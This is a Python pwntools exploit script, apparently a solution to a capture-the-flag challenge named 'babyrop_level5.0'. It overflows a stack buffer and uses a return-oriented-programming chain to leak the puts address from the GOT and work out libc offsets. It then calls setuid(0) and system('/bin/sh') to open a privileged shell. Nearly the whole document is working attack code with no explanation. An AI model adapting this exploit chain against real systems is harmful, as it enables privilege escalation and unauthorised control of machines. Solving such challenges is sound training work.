from pwn import *

def bytes_to_hex(data):
  """Converts bytes to a hex  and reverses the byte order.

  Args:
    data: A byte string.

  Returns:
    A hex  with the byte order reversed.
  """
  return int(''.join(['{:02x}'.format(b) for b in reversed(data)]), 16)

context.log_level = 'debug'
offset = b'a'*88

puts_plt = p64(0x401110)
puts_got = p64(0x404028)
main = p64(0x4011b0)

ret = p64(0x40101a)
poprax_ret          = p64(0x401c28)
poprdi_ret          = p64(0x401c60)
poprsi_ret          = p64(0x401c58)
poprdx_ret          = p64(0x401c38)
syscall = p64(0x401c30)

#0000000000052290 <__libc_system@@GLIBC_PRIVATE>
system_libc_offset  = 0x52290

#0000000000084420 <_IO_puts@@GLIBC_2.2.5>:
puts_libc_offset  = 0x84420

#00000000000e4150 <setuid@@GLIBC_2.2.5>
setuid_libc_offset = 0xe4150 

#"/bin/sh"
binsh_libc_offset = 0x1b45bd


payload_leak = offset
payload_leak += poprdi_ret
payload_leak += puts_got
payload_leak += puts_plt
payload_leak += main

r = process('/challenge/babyrop_level5.0')
r.recvuntil(b'Return Oriented Programming!\n')
r.sendline(payload_leak)
r.recvuntil(b'Leaving!\n')
addr_puts_byte = r.recv(6)
addr_puts = bytes_to_hex(addr_puts_byte)
print(f"LEAKKKKKKKKKK {addr_puts_byte} : {hex(addr_puts)}")

addr_system = addr_puts - puts_libc_offset + system_libc_offset
addr_binsh = addr_puts - puts_libc_offset + binsh_libc_offset
addr_setuid = addr_puts - puts_libc_offset + setuid_libc_offset


r.recvuntil(b'Return Oriented Programming!\n')

payload = offset 
payload += poprdi_ret
payload += p64(0)
payload += p64(addr_setuid)
payload += poprdi_ret
payload += p64(addr_binsh)
payload += p64(addr_system)

r.sendline(payload)


r.interactive()